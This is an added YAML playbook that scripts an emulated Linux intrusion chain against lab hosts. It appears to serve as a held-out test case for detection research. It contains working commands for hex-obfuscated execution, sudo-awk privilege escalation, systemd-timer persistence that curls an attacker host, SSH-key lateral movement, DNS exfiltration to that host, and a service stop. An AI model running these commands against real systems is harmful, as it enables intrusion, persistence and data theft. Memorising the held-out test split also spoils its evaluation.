@@ -1,0 +1,67 @@
+###
+# L5 — held-out "unseen" variant (generalization test). Split: TEST.
+# Deliberately uses techniques NOT in L1-L4: systemd TIMER persistence, hex-encoded ED,
+# sudo-misconfig privesc, DNS-style exfil. Parallels SL700 fold e_a/f_a (unseen variant).
+# Keep this run OUT of TRAIN so TEST measures generalization, not memorization.
+# AUTHORIZED LAB ONLY. Written, not executed.
+vars:
+  $VICTIM1: 172.31.250.228
+  $VICTIM2: 172.31.250.208
+  $ATTACKER: 172.31.250.253
+  $WEBUSER: www-data
+  $SVC_PASS: CHANGE_ME_lab_service_pw
+  $LABUSER: kltn
+  $LABKEY: /root/.ssh/lab_ed25519
+  $CANARY: /opt/kltn-canary
+  $IMPACT_SVC: cron
+
+commands:
+  - type: ssh
+    cmd: "id\n"
+    hostname: $VICTIM1
+    username: $WEBUSER
+    password: $SVC_PASS
+    creates_session: foothold
+    metadata: { description: "assume-breach foothold", techniques: "T1190,T1078.003", tactics: "Initial Access" }
+
+  # hex-encoded discovery (different encoder than L2)
+  - type: ssh
+    cmd: "H=$(printf 'id; uname -a; getent passwd; crontab -l' | xxd -p | tr -d '\\n'); echo \"$H\" | xxd -r -p | sh\n"
+    session: foothold
+    metadata: { description: "hex-encoded discovery", techniques: "T1027,T1140,T1082", tactics: "Defense Evasion,Discovery" }
+
+  # privesc: sudo misconfig (different from pkexec used in TRAIN)
+  - type: ssh
+    cmd: "sudo -n awk 'BEGIN{system(\"/bin/sh -p\")}' 2>/dev/null <<< 'id'\n"
+    session: foothold
+    interactive: True
+    exit_on_error: False
+    metadata: { description: "GTFOBins sudo-awk privesc", techniques: "T1548.003", tactics: "Privilege Escalation" }
+
+  # persistence: systemd TIMER (unseen in TRAIN)
+  - type: ssh
+    cmd: "sudo bash -c 'printf \"[Unit]\\nDescription=u\\n[Timer]\\nOnCalendar=*:0/10\\n[Install]\\nWantedBy=timers.target\\n\" > /etc/systemd/system/u.timer; printf \"[Service]\\nExecStart=/bin/bash -c \\\"curl -s http://$ATTACKER/t\\\"\\n\" > /etc/systemd/system/u.service; systemctl daemon-reload; systemctl enable --now u.timer' 2>/dev/null; echo ok\n"
+    session: foothold
+    interactive: True
+    exit_on_error: False
+    metadata: { description: "systemd timer persistence", techniques: "T1053.003,T1543.002", tactics: "Persistence", telemetry: "filemod /etc/systemd/system/*.timer" }
+
+  # lateral: ssh key (reuse harvested key)
+  - type: ssh
+    cmd: "ssh -i $LABKEY -o StrictHostKeyChecking=no $LABUSER@$VICTIM2 'hostname; ps aux | head'\n"
+    session: foothold
+    interactive: True
+    metadata: { description: "ssh-key lateral", techniques: "T1021.004,T1552.004", tactics: "Lateral Movement" }
+
+  # exfil: DNS-style (different channel than curl POST)
+  - type: ssh
+    cmd: "for c in $(getent passwd | md5sum | cut -c1-16 | fold -w4); do nslookup $c.$ATTACKER >/dev/null 2>&1 || true; done; echo exfil-done\n"
+    session: foothold
+    metadata: { description: "DNS-style exfil of a digest", techniques: "T1048.003,T1041", tactics: "Exfiltration", telemetry: "repeated DNS netconn -> $ATTACKER" }
+
+  # impact: service stop (different from encryption-heavy TRAIN impact)
+  - type: ssh
+    cmd: "sudo systemctl stop $IMPACT_SVC 2>/dev/null; systemctl is-active $IMPACT_SVC || true\n"
+    session: foothold
+    interactive: True
+    metadata: { description: "service stop (reversible)", techniques: "T1489", tactics: "Impact" }
